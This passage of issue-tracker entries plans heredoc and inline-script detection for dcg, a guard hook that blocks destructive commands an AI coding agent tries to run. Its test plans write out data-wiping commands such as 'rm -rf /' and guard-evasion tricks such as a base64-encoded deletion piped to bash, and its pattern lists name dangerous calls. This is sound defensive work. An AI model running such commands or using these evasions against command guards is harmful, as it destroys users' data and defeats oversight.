\u0026heredoc).is_some());\n}\n```","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-cpal","depends_on_id":"git_safety_guard-hcfg","type":"blocks","created_at":"2026-01-07T19:46:47.559411582-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-du4","title":"Implement language detection from command context","description":"# Implement Language Detection from Command Context\n\n## Objective\nImplement the language detection logic that determines which parser/patterns to use for heredoc content.\n\n## Background\nBased on the design (git_safety_guard-jfj), implement the multi-source language detection:\n1. Command prefix lookup\n2. Shebang detection\n3. Content heuristics (fallback)\n\n## Implementation Details\n\n### Language Enum\n\n```rust\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]\npub enum Language {\n    Python,\n    Bash,\n    JavaScript,\n    TypeScript,\n    Ruby,\n    Perl,\n    Php,\n    Unknown,\n}\n\nimpl Language {\n    /// Get the tree-sitter/ast-grep language identifier\n    pub fn grammar_name(\u0026self) -\u003e Option\u003c\u0026'static str\u003e {\n        match self {\n            Self::Python =\u003e Some(\"python\"),\n            Self::Bash =\u003e Some(\"bash\"),\n            Self::JavaScript =\u003e Some(\"javascript\"),\n            Self::TypeScript =\u003e Some(\"typescript\"),\n            Self::Ruby =\u003e Some(\"ruby\"),\n            Self::Perl =\u003e Some(\"perl\"),\n            Self::Php =\u003e Some(\"php\"),\n            Self::Unknown =\u003e None,\n        }\n    }\n}\n```\n\n### Command Prefix Mapping\n\n```rust\nstatic COMMAND_LANGUAGE_MAP: LazyLock\u003cHashMap\u003c\u0026'static str, Language\u003e\u003e = LazyLock::new(|| {\n    let mut m = HashMap::new();\n    // Python\n    m.insert(\"python\", Language::Python);\n    m.insert(\"python3\", Language::Python);\n    m.insert(\"python2\", Language::Python);\n    // Bash/Shell\n    m.insert(\"bash\", Language::Bash);\n    m.insert(\"sh\", Language::Bash);\n    m.insert(\"zsh\", Language::Bash);\n    m.insert(\"ksh\", Language::Bash);\n    // JavaScript/Node\n    m.insert(\"node\", Language::JavaScript);\n    m.insert(\"nodejs\", Language::JavaScript);\n    // ... etc\n    m\n});\n\npub fn detect_from_command(cmd: \u0026str) -\u003e Option\u003cLanguage\u003e {\n    // Extract first word (command name)\n    let first_word = cmd.split_whitespace().next()?;\n    // Handle paths: /usr/bin/python3 -\u003e python3\n    let basename = first_word.rsplit('/').next()?;\n    COMMAND_LANGUAGE_MAP.get(basename).copied()\n}\n```\n\n### Shebang Detection\n\n```rust\npub fn detect_from_shebang(content: \u0026str) -\u003e Option\u003cLanguage\u003e {\n    let first_line = content.lines().next()?;\n    if !first_line.starts_with(\"#!\") {\n        return None;\n    }\n    // Parse: #!/usr/bin/env python3 -\u003e python3\n    // Parse: #!/bin/bash -\u003e bash\n    let interpreter = first_line\n        .strip_prefix(\"#!\")?\n        .trim()\n        .split_whitespace()\n        .last()?\n        .rsplit('/')\n        .next()?;\n    COMMAND_LANGUAGE_MAP.get(interpreter).copied()\n}\n```\n\n### Content Heuristics (Fallback)\n\n```rust\npub fn detect_from_content(content: \u0026str) -\u003e Option\u003cLanguage\u003e {\n    // Very basic heuristics - only if nothing else works\n    let lines: Vec\u003c\u0026str\u003e = content.lines().take(10).collect();\n    \n    // Python indicators\n    if lines.iter().any(|l| l.starts_with(\"import \") || l.starts_with(\"from \")) {\n        return Some(Language::Python);\n    }\n    \n    // JavaScript/Node indicators\n    if lines.iter().any(|l| l.contains(\"require(\") || l.contains(\"const \") || l.contains(\"let \")) {\n        return Some(Language::JavaScript);\n    }\n    \n    // Ruby indicators\n    if lines.iter().any(|l| l.starts_with(\"def \") \u0026\u0026 content.contains(\"end\")) {\n        return Some(Language::Ruby);\n    }\n    \n    None\n}\n```\n\n### Combined Detection\n\n```rust\npub fn detect_language(cmd: \u0026str, heredoc: \u0026HeredocContent) -\u003e Language {\n    // Priority 1: Command prefix\n    if let Some(lang) = detect_from_command(cmd) {\n        return lang;\n    }\n    \n    // Priority 2: Shebang\n    if let Some(lang) = detect_from_shebang(\u0026heredoc.content) {\n        return lang;\n    }\n    \n    // Priority 3: Content heuristics\n    if let Some(lang) = detect_from_content(\u0026heredoc.content) {\n        return lang;\n    }\n    \n    Language::Unknown\n}\n```\n\n## Files to Modify\n- New: src/heredoc/language.rs\n- src/heredoc/mod.rs\n\n## Testing\n- Test command prefix for all supported commands\n- Test shebang detection with various formats\n- Test content heuristics\n- Test fallback chain\n\n## Dependencies\n- Design: language detection heuristics (git_safety_guard-jfj)\n- Implement heredoc extraction (git_safety_guard-y4j)\n\n## Success Criteria\n- Correctly identify language in 95%+ of test cases\n- No panics on malformed input\n- Clear Language::Unknown for genuinely unknown cases","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:31:49.058497233-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:31:49.058497233-05:00","dependencies":[{"issue_id":"git_safety_guard-du4","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T18:31:58.308674617-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-du4","depends_on_id":"git_safety_guard-jfj","type":"blocks","created_at":"2026-01-07T18:31:58.326331058-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-e2eh","title":"Extend e2e_test.sh with heredoc test cases","description":"# E2E Test Script Extension for Heredocs\n\n## Objective\n\nExtend the existing `scripts/e2e_test.sh` with comprehensive heredoc test cases.\n\n## Test Categories to Add\n\n### 1. Heredoc Detection Tests\n\n```bash\n# Should BLOCK - Python heredoc with os.system\ntest_blocked 'python3 \u003c\u003c EOF\nimport os\nos.system(\"rm -rf /tmp/test\")\nEOF' \"Python heredoc with os.system\"\n\n# Should BLOCK - Bash heredoc with rm\ntest_blocked 'bash \u003c\u003c EOF\nrm -rf /important\nEOF' \"Bash heredoc with rm -rf\"\n\n# Should BLOCK - Node inline script\ntest_blocked 'node -e \"require('child_process').execSync('rm -rf /')\"' \"Node inline with execSync\"\n```\n\n### 2. Heredoc Variant Tests\n\n```bash\n# Test all heredoc syntaxes\ntest_blocked 'cat \u003c\u003cEOF | python3\nimport os; os.system(\"rm -rf /\")\nEOF' \"Piped heredoc\"\n\ntest_blocked 'python3 \u003c\u003c-EOF\n    import os\n    os.system(\"rm -rf /\")\nEOF' \"Indented heredoc (\u003c\u003c-)\"\n\ntest_blocked 'python3 \u003c\u003c'EOF'\nimport os\nos.system(\"rm -rf /\")\nEOF' \"Quoted delimiter heredoc\"\n```\n\n### 3. Language Coverage Tests\n\n```bash\n# Python\ntest_blocked 'python3 -c \"import shutil; shutil.rmtree('/tmp')\"'\n\n# Ruby  \ntest_blocked 'ruby -e \"FileUtils.rm_rf('/tmp')\"'\n\n# Perl\ntest_blocked 'perl -e \"system('rm -rf /')\"'\n\n# JavaScript\ntest_blocked 'node -e \"require('fs').rmdirSync('/', {recursive:true})\"'\n```\n\n### 4. False Positive Tests\n\n```bash\n# Should ALLOW - Documentation with dangerous strings\ntest_allowed 'bd create --description=\"This pattern blocks rm -rf\"' \"Doc with rm -rf\"\ntest_allowed 'git commit -m \"Fix git reset --hard detection\"' \"Commit msg\"\ntest_allowed 'grep \"rm -rf\" src/main.rs' \"Grep for pattern\"\ntest_allowed 'echo \"example: git push --force\"' \"Echo example\"\n```\n\n### 5. Bypass Attempt Tests\n\n```bash\n# Variable indirection\ntest_blocked 'bash -c \"CMD=rm; \\$CMD -rf /\"' \"Variable indirection\"\n\n# Base64 encoding\ntest_blocked 'bash -c \"echo cm0gLXJmIC8K | base64 -d | bash\"' \"Base64 bypass\"\n\n# String concatenation  \ntest_blocked 'python3 -c \"exec('r'+'m'+' -rf /')\"' \"String concat\"\n```\n\n### 6. Edge Cases\n\n```bash\n# Empty heredoc\ntest_allowed 'cat \u003c\u003c EOF\nEOF' \"Empty heredoc\"\n\n# Safe heredoc content\ntest_allowed 'python3 \u003c\u003c EOF\nprint(\"hello world\")\nEOF' \"Safe Python heredoc\"\n\n# Nested quotes\ntest_blocked 'bash -c \"bash -c 'rm -rf /'\"' \"Nested shells\"\n```\n\n## Logging Enhancement\n\nAdd verbose mode:\n```bash\n#!/bin/bash\nset -euo pipefail\n\nVERBOSE=${VERBOSE:-0}\nLOG_FILE=\"e2e_test_$(date +%Y%m%d_%H%M%S).log\"\n\nlog() {\n    echo \"[$(date '+%H:%M:%S')] $*\" | tee -a \"$LOG_FILE\"\n}\n\ntest_blocked() {\n    local cmd=\"$1\"\n    local desc=\"$2\"\n    log \"TEST: $desc\"\n    log \"  CMD: ${cmd:0:80}...\"\n    \n    if echo \"{\\\"tool_name\\\":\\\"Bash\\\",\\\"tool_input\\\":{\\\"command\\\":\\\"$cmd\\\"}}\" | ./target/release/dcg 2\u003e/dev/null; then\n        log \"  FAIL: Expected block, got allow\"\n        return 1\n    else\n        log \"  PASS: Correctly blocked\"\n        return 0\n    fi\n}\n```\n\n## Output Summary\n\nAt end of test run:\n```\n=====================================\nE2E Test Summary\n=====================================\nTotal tests: 150\nPassed: 148\nFailed: 2\nSkipped: 0\n\nFailed tests:\n  - Python heredoc with subprocess (line 234)\n  - Node inline with dynamic require (line 456)\n\nLog file: e2e_test_20260107_193045.log\n=====================================\n```","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-e2eh","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:32.841249285-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e2eh","depends_on_id":"git_safety_guard-99e.5","type":"blocks","created_at":"2026-01-07T20:08:55.268336107-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-e7m","title":"Integrate heredoc detection into main check pipeline","description":"## Objective\n\nIntegrate all heredoc detection components into the main dcg check pipeline, creating a seamless flow from command input to block/allow decision.\n\n## Pipeline Architecture\n\n```\nJSON Input â†’ Parse â†’ Quick Reject â†’ Normalize â†’\n  â†’ Heredoc Detection â†’ [if heredoc found] â†’\n    â†’ Extract Content â†’ Detect Language â†’ Parse with ast-grep â†’\n    â†’ Apply Language Patterns â†’ Block Decision\n  â†’ [no heredoc] â†’ Existing Pattern Matching â†’ Block Decision\n```\n\n## Integration Points\n\n### 1. Entry Point Hook\n\nModify main.rs check flow to:\n1. After quick reject passes, check for heredoc indicators\n2. If heredoc found, branch to heredoc analysis path\n3. If no heredoc, continue with existing pattern matching\n4. Merge results from both paths\n\n### 2. Heredoc Detection Integration\n\nInsert heredoc detection before main pattern matching:\n```rust\nfn check_command(cmd: \u0026str) -\u003e CheckResult {\n    // Quick reject (existing)\n    if global_quick_reject(cmd) {\n        return CheckResult::allowed();\n    }\n\n    // NEW: Heredoc detection\n    if let Some(heredoc_result) = check_heredoc(cmd) {\n        if heredoc_result.blocked {\n            return heredoc_result;\n        }\n    }\n\n    // Existing pattern matching\n    REGISTRY.check_command(cmd, \u0026enabled_packs)\n}\n```\n\n### 3. Performance Budget\n\nTotal additional latency budget: 50ms worst case\n- Heredoc detection regex: \u003c2ms\n- Content extraction: \u003c1ms\n- Language detection: \u003c1ms\n- ast-grep invocation: \u003c40ms (external process)\n- Pattern matching: \u003c5ms\n\nIf ast-grep is too slow, fall back to regex patterns for the heredoc body.\n\n### 4. Feature Flag\n\nAdd heredoc scanning to pack system:\n- New pack: \"heredoc\" or integrate into \"core\"\n- Can be enabled/disabled via configuration\n- Default: enabled for new installations\n\n### 5. Error Handling\n\nGraceful degradation:\n- ast-grep not installed â†’ warn, fall back to regex\n- ast-grep timeout â†’ allow command, log warning\n- Parse error â†’ allow command, log for debugging\n- Unknown language â†’ use generic patterns or allow\n\n## Configuration\n\nNew config options:\n```toml\n[heredoc]\nenabled = true\ntimeout_ms = 50\nfallback_on_error = true\nlanguages = [\"python\", \"bash\", \"javascript\", \"typescript\", \"ruby\", \"perl\"]\n```\n\n## Testing Integration\n\nIntegration tests should cover:\n- Normal commands (no heredoc) still work fast\n- Heredoc commands get analyzed\n- Pattern matches in heredocs block correctly\n- Safe heredocs pass through\n- Error paths handle gracefully\n\n## Dependencies\n\n- Heredoc syntax detection\n- Content extraction\n- Language detection\n- ast-grep invocation layer\n- All language patterns\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:38:07.195631302-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:39:16.10840837-05:00","dependencies":[{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-49s","type":"blocks","created_at":"2026-01-07T18:39:24.471336629-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T18:39:24.491188224-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T18:39:24.509697502-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:39:24.528749381-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-2cu","type":"blocks","created_at":"2026-01-07T18:39:31.682050985-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-beq","type":"blocks","created_at":"2026-01-07T18:39:31.702476952-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-uau","type":"blocks","created_at":"2026-01-07T18:39:31.720255513-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-mcf","type":"blocks","created_at":"2026-01-07T18:39:31.739706774-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-26f","type":"blocks","created_at":"2026-01-07T18:39:31.75902245-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-mvh","type":"blocks","created_at":"2026-01-07T18:39:31.776348198-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-2d4","type":"blocks","created_at":"2026-01-07T18:39:31.795580477-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:08:41.394423996-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-ehc","title":"Implement GitLab CI extractor (.gitlab-ci.yml)","description":"## Objective\n\nImplement an extractor for GitLab CI YAML files to detect executable command contexts.\n\n## File Pattern\n\n- `.gitlab-ci.yml`\n- `*.gitlab-ci.yml` (includes)\n\n## Extraction Targets\n\n### Script Blocks (executed)\n- `script:` arrays\n- `before_script:` arrays\n- `after_script:` arrays\n\n### NOT Extracted (data only)\n- `variables:` values\n- `rules:` conditions\n- `only:`/`except:` patterns\n- Comments\n\n## Example\n\n```yaml\ndeploy:\n  script:\n    - kubectl delete namespace prod  # EXTRACT THIS\n  variables:\n    DANGEROUS: \"rm -rf /\"  # DO NOT extract\n```\n\n## Acceptance Criteria\n\n- Correctly extracts script blocks with line numbers\n- Ignores variable definitions and comments\n- Handles YAML anchors and aliases\n- Unit tests with representative fixtures","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T21:24:57.250174884-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:24:57.250174884-05:00","dependencies":[{"issue_id":"git_safety_guard-ehc","depends_on_id":"git_safety_guard-scan","type":"blocks","created_at":"2026-01-07T21:25:20.517428749-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-erux","title":"Design user-friendly error messages for heredoc blocks","description":"# User-Friendly Error Messages for Heredoc Blocking\n\n## Objective\n\nWhen a heredoc command is blocked, provide clear, actionable error messages that help users understand WHY it was blocked and HOW to proceed.\n\n## Current Error Format (for reference)\n\n```\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\nâ•‘  âš ï¸  BLOCKED: Destructive Command Detected                   â•‘\nâ• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\nâ•‘  Command: git reset --hard HEAD~5                            â•‘\nâ•‘  Reason:  Hard reset can permanently lose commits            â•‘\nâ•‘  Pack:    core.git                                           â•‘\nâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n```\n\n## Enhanced Error Format for Heredocs\n\n```\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\nâ•‘  âš ï¸  BLOCKED: Destructive Pattern in Heredoc                 â•‘\nâ• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\nâ•‘  Language: Python                                            â•‘\nâ•‘  Pattern:  os.system($CMD)                                   â•‘\nâ•‘  Matched:  os.system(\"rm -rf /tmp/data\")                    â•‘\nâ•‘  Line:     3 of heredoc                                      â•‘\nâ•‘  Reason:   Shell command execution via os.system             â•‘\nâ•‘  Pack:     heredoc.python                                    â•‘\nâ• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\nâ•‘  Context:                                                    â•‘\nâ•‘    1â”‚ import os                                              â•‘\nâ•‘    2â”‚ path = \"/tmp/data\"                                    â•‘\nâ•‘  â–¶ 3â”‚ os.system(\"rm -rf /tmp/data\")  â† BLOCKED             â•‘\nâ•‘    4â”‚ print(\"done\")                                         â•‘\nâ• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\nâ•‘  ğŸ’¡ Suggestions:                                             â•‘\nâ•‘  â€¢ Use pathlib.Path.unlink() for single file deletion       â•‘\nâ•‘  â€¢ Use shutil.rmtree() with explicit path validation        â•‘\nâ•‘  â€¢ If intentional, use dcg allow --reason \"...\"             â•‘\nâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n```\n\n## Error Message Components\n\n### 1. Header\n- Clear indication this is a BLOCK, not just a warning\n- Specify it's a heredoc/inline script detection\n\n### 2. Detection Details\n- Language detected\n- Pattern name that matched\n- Actual matched text (truncated if long)\n- Line number within heredoc\n- Human-readable reason\n\n### 3. Context Window\n- Show 2-3 lines before and after the match\n- Highlight the offending line with arrow\n- Syntax highlighting if terminal supports it\n\n### 4. Suggestions\n- Language-specific safe alternatives\n- How to override if intentional\n- Link to documentation\n\n## JSON Output Format\n\nFor Claude Code hook protocol:\n\n```json\n{\n  \"hookSpecificOutput\": {\n    \"permissionDecision\": \"deny\",\n    \"reason\": \"Heredoc contains destructive pattern: os.system with shell command\",\n    \"details\": {\n      \"detection_type\": \"heredoc\",\n      \"language\": \"python\",\n      \"pattern\": \"os.system($CMD)\",\n      \"matched_text\": \"os.system(\\\"rm -rf /tmp/data\\\")\",\n      \"line_in_heredoc\": 3,\n      \"pack\": \"heredoc.python\",\n      \"suggestions\": [\n        \"Use pathlib.Path.unlink() for single file deletion\",\n        \"Use shutil.rmtree() with explicit path validation\"\n      ]\n    }\n  }\n}\n```\n\n## Suggestions Database\n\nMaintain per-pattern suggestions:\n\n```rust\nstatic PATTERN_SUGGESTIONS: \u0026[(\u0026str, \u0026[\u0026str])] = \u0026[\n    (\"os.system\", \u0026[\n        \"Use subprocess.run() with shell=False\",\n        \"Use pathlib for file operations\",\n    ]),\n    (\"shutil.rmtree\", \u0026[\n        \"Validate path is within expected directory\",\n        \"Use explicit allowlist of deletable paths\",\n    ]),\n    (\"exec\", \u0026[\n        \"Use importlib for dynamic imports\",\n        \"Consider ast.literal_eval for safe evaluation\",\n    ]),\n];\n```\n\n## Test Cases\n\n- Verify all pattern types have suggestions\n- Verify context window is correctly extracted\n- Verify line numbers are accurate\n- Verify JSON output is valid\n- Verify color output is readable\n- Verify truncation for long matches","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:45:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:45:00-05:00","dependencies":[{"issue_id":"git_safety_guard-erux","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:30:59.175383831-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-f4f","title":"Implement ast-grep-core pattern matching layer","description":"# ast-grep-core Pattern Matching Layer\n\n## Objective\n\nIntegrate ast-grep-core as a Rust library for structural pattern matching in heredoc content.\n\n## Architecture Decision\n\n**EMBED ast-grep-core directly** - NOT shell out to CLI\n\nRationale:\n- Sub-millisecond latency (no process spawn)\n- Single binary distribution (no external dependencies)\n- Better error handling\n- Type-safe Rust API\n\n## Dependencies to Add\n\n```toml\n[dependencies]\nast-grep-core = \"0.40\"\nast-grep-language = { version = \"0.37\", features = [\n    \"bash\",\n    \"python\", \n    \"javascript\",\n    \"typescript\",\n    \"ruby\"\n    # Note: Perl may not be available\n] }\n```\n\n## API Design\n\n```rust\n/// Pattern matcher using ast-grep-core\npub struct AstMatcher {\n    patterns: HashMap\u003cLanguage, Vec\u003cCompiledPattern\u003e\u003e,\n}\n\nimpl AstMatcher {\n    /// Create matcher with default destructive patterns\n    pub fn new() -\u003e Self;\n    \n    /// Load patterns from config\n    pub fn from_config(config: \u0026PatternConfig) -\u003e Result\u003cSelf\u003e;\n    \n    /// Match patterns against code\n    pub fn find_matches(\n        \u0026self,\n        code: \u0026str,\n        language: Language,\n    ) -\u003e Vec\u003cPatternMatch\u003e;\n}\n\n/// Result of pattern matching\npub struct PatternMatch {\n    pub pattern_name: String,\n    pub reason: String,\n    pub matched_text: String,\n    pub line_number: usize,\n    pub severity: Severity,\n}\n\npub enum Severity {\n    Block,      // Always block\n    Warn,       // Log warning but allow\n    Info,       // Informational only\n}\n```\n\n## Pattern Definition Format\n\nPatterns use ast-grep's intuitive syntax:\n\n```rust\nstatic PYTHON_PATTERNS: \u0026[(\u0026str, \u0026str, \u0026str)] = \u0026[\n    // (name, pattern, reason)\n    (\"os_system\", \"os.system($CMD)\", \"Direct shell execution via os.system\"),\n    (\"subprocess_shell\", \"subprocess.run($$$ARGS, shell=True)\", \"Shell execution via subprocess\"),\n    (\"shutil_rmtree\", \"shutil.rmtree($PATH)\", \"Recursive directory deletion\"),\n    (\"exec_call\", \"exec($CODE)\", \"Dynamic code execution\"),\n    (\"eval_call\", \"eval($CODE)\", \"Dynamic code evaluation\"),\n];\n```\n\n## Error Handling\n\n```rust\npub enum MatchError {\n    UnsupportedLanguage(Language),\n    ParseError { language: Language, error: String },\n    PatternCompileError { pattern: String, error: String },\n    Timeout { elapsed_ms: u64 },\n}\n\n/// Graceful degradation on errors\nimpl AstMatcher {\n    pub fn find_matches_with_fallback(\n        \u0026self,\n        code: \u0026str,\n        language: Language,\n    ) -\u003e Result\u003cVec\u003cPatternMatch\u003e, MatchError\u003e {\n        match self.find_matches_internal(code, language) {\n            Ok(matches) =\u003e Ok(matches),\n            Err(MatchError::Timeout { .. }) =\u003e {\n                tracing::warn!(\"AST matching timed out, allowing command\");\n                Ok(vec![])  // Fail-open\n            }\n            Err(e) =\u003e Err(e),\n        }\n    }\n}\n```\n\n## Performance\n\nTarget latency:\n- Pattern compilation: One-time at startup (\u003c100ms for all languages)\n- Code parsing: \u003c2ms for typical heredoc (100 lines)\n- Pattern matching: \u003c1ms per pattern set\n- Total: \u003c5ms for full analysis\n\n## Test Cases\n\n```rust\n#[test]\nfn test_python_os_system_detection() {\n    let matcher = AstMatcher::new();\n    let code = \"import os\\nos.system('rm -rf /')\";\n    let matches = matcher.find_matches(code, Language::Python);\n    \n    assert_eq!(matches.len(), 1);\n    assert_eq!(matches[0].pattern_name, \"os_system\");\n}\n\n#[test]\nfn test_safe_python_code() {\n    let matcher = AstMatcher::new();\n    let code = \"print('hello world')\";\n    let matches = matcher.find_matches(code, Language::Python);\n    \n    assert!(matches.is_empty());\n}\n```","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:32:24.313325332-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:22:11.684116514-05:00","dependencies":[{"issue_id":"git_safety_guard-f4f","depends_on_id":"git_safety_guard-5ib","type":"blocks","created_at":"2026-01-07T18:32:32.909572665-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-f4f","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T18:32:32.929896409-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-fpim","title":"Implement false positive reduction for string arguments","description":"# False Positive Reduction Implementation\n\n## Problem\n\nCurrent regex patterns match dangerous strings even in safe contexts:\n- `bd create --description=\"This blocks rm -rf\"` â†’ BLOCKED (wrong!)\n- `git commit -m \"Fix rm -rf pattern\"` â†’ BLOCKED (wrong!)\n- `grep \"rm -rf\" patterns.txt` â†’ BLOCKED (wrong!)\n\n## Solution\n\nParse command structure to identify execution context before applying destructive patterns.\n\n## Implementation\n\n### 1. Safe Command Registry\n\n```rust\nstatic SAFE_STRING_ARG_COMMANDS: \u0026[(\u0026str, \u0026[\u0026str])] = \u0026[\n    (\"bd\", \u0026[\"--description\", \"--title\", \"-d\", \"-t\"]),\n    (\"git\", \u0026[\"commit -m\", \"tag -m\", \"notes add -m\"]),\n    (\"grep\", \u0026[\"-e\", \"--regexp\"]),\n    (\"rg\", \u0026[\"-e\", \"--regexp\"]),\n    (\"echo\", \u0026[]),  // all args are strings\n    (\"printf\", \u0026[]),\n];\n```\n\n### 2. Execution Context Detection\n\n```rust\nenum ExecutionContext {\n    Direct,           // Command itself is executed\n    StringArgument,   // Inside quoted string argument to safe command\n    HeredocBody,      // Inside heredoc (needs Tier 2 analysis)\n    PipeTarget,       // Right side of pipe (executed)\n    CommandSubst,     // Inside $() or backticks (executed)\n}\n\nfn detect_execution_context(cmd: \u0026str, position: usize) -\u003e ExecutionContext;\n```\n\n### 3. Integration Point\n\nModify main check flow:\n\n```rust\nfn check_command(cmd: \u0026str) -\u003e CheckResult {\n    // Quick reject (existing)\n    if global_quick_reject(cmd) {\n        return CheckResult::allowed();\n    }\n    \n    // NEW: Check if dangerous patterns are in safe context\n    if is_safe_string_context(cmd) {\n        return CheckResult::allowed();\n    }\n    \n    // Continue with heredoc detection and pattern matching...\n}\n```\n\n## Test Cases\n\n### Must ALLOW (false positive prevention)\n- `bd create --description=\"Pattern blocks rm -rf commands\"`\n- `git commit -m \"Fix git reset --hard detection\"`\n- `grep \"rm -rf\" src/patterns.rs`\n- `echo \"example: git push --force\"`\n- `rg -e \"DROP TABLE\" --type sql`\n\n### Must BLOCK (true positives preserved)\n- `rm -rf /tmp/*`\n- `git reset --hard HEAD~5`\n- `bash -c \"rm -rf /\"`\n- `echo \"hi\" | bash -c \"rm -rf /\"`\n\n## Performance\n\n- \u003c 100 microseconds additional overhead\n- Simple string prefix matching for command detection\n- No regex needed for this layer\n\n## Dependencies\n\n- Depends on: False positive design (2cu)","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-2cu","type":"blocks","created_at":"2026-01-07T19:28:32.226122941-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T20:02:22.808621071-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-t8x.1","type":"blocks","created_at":"2026-01-07T20:03:42.899745326-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-t8x.2","type":"blocks","created_at":"2026-01-07T20:03:47.932828938-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:03:52.966413813-05:00","created_by":"ubuntu"}]}
